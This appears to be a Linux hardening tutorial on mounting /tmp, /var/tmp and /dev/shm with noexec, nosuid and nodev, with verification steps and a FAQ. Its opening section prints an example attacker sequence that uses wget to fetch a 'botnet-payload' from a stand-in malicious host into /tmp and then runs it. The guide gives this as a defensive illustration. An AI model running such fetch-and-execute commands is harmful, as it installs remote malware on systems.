How to Secure /tmp, /var/tmp, and /dev/shm on Linux: 2026 Hardening Guide

Under standard Linux installations, /tmp and /dev/shm (shared memory) are world-writable directories accessible to every system user and daemon. When web applications (such as WordPress, PHP-FPM, or Python web servers) suffer remote code execution or file upload vulnerabilities, attackers routinely stage reverse shells and rootkits in /tmp. Hardening these partitions with nosuid, noexec, and nodev is a core CIS Benchmark and PCI-DSS compliance requirement.

The Dangerous Nature of World-Writable Directories

By design, temporary directories have permissions set to 1777 (drwxrwxrwt), allowing any local user or unprivileged service account to create and write files. If attackers achieve an arbitrary file upload, their immediate next step is executing a binary payload: 

# Attackers routinely execute binaries directly from /tmp
cd /tmp
wget https://malicious-host.xyz/botnet-payload -O agent
chmod +x agent
./agent &

Mounting /tmp with the noexec flag completely neutralizes this attack vector by blocking kernel syscall execution on any file within the mount point.

Step 1: Check Current Mount Status

Inspect existing mount options for temporary filesystems:

mount | grep -E "( /tmp | /dev/shm )"
df -h /tmp /dev/shm

If /tmp is merely a directory on the root partition rather than an isolated mount point, you must mount it as a dedicated filesystem or tmpfs.

Step 2: Harden /tmp Using systemd or tmpfs

Modern Linux distributions (Ubuntu 22.04+, Debian 12, RHEL 9, Rocky Linux) manage /tmp as a RAM-backed tmpfs via systemd. Enable and secure it: 

# Copy systemd tmp mount template
sudo cp /usr/share/systemd/tmp.mount /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now tmp.mount

To enforce strict security flags, edit /etc/systemd/system/tmp.mount or define them in /etc/fstab: 

sudo nano /etc/fstab

Add the hardened /tmp line:

# Secure /tmp with tmpfs
tmpfs   /tmp   tmpfs   rw,nosuid,nodev,noexec,relatime,size=2G   0  0

Step 3: Secure /var/tmp with Bind Mount

/var/tmp is used for temporary files that persist across reboots. Rather than maintaining a separate partition, bind mount /var/tmp to point to /tmp in /etc/fstab: 

# Bind mount /var/tmp to /tmp to inherit security flags
/tmp   /var/tmp   none   bind,nosuid,nodev,noexec   0  0

Step 4: Harden /dev/shm (Shared Memory)

/dev/shm provides POSIX shared memory. While processes need to read and write shared memory segments, they rarely need to execute compiled binaries directly from it. Update /dev/shm in /etc/fstab: 

# Secure POSIX shared memory
tmpfs   /dev/shm   tmpfs   rw,nosuid,nodev,noexec   0  0

Step 5: Apply Mount Options and Verify Execution Block

Apply the new mounts without rebooting:

sudo mount -o remount /tmp
sudo mount -o remount /dev/shm
sudo mount -a

Verify that execution is strictly forbidden by compiling or running a test script inside /tmp: 

echo '#!/bin/bash' > /tmp/test-script.sh
echo 'echo "Execution allowed!"' >> /tmp/test-script.sh
chmod +x /tmp/test-script.sh

/tmp/test-script.sh

Expected secure response from the Linux kernel:

-bash: /tmp/test-script.sh: Permission denied

Frequently Asked Questions

Why are /tmp and /dev/shm prime targets for Linux malware and attackers?

Because temporary directories require world-writable permissions (1777 / sticky bit) so any process can create temp files. Attackers exploit this to download malicious payloads or compile root exploits. Restricting execution with noexec prevents binaries and scripts from running directly inside /tmp.

What do the nosuid, noexec, and nodev mount flags do?

nosuid disables SetUID and SetGID execution, preventing privilege escalation. noexec prevents execution of any binaries or scripts residing on that partition. nodev blocks the operating system from creating or interpreting block or character special device files.

Will mounting /tmp with noexec break package managers like apt or yum/dnf?

Certain package managers execute temporary scripts during upgrades or kernel builds. If an upgrade fails due to noexec, temporarily remount /tmp with execution privileges (sudo mount -o remount,exec /tmp), perform the upgrade, and remount it with noexec.
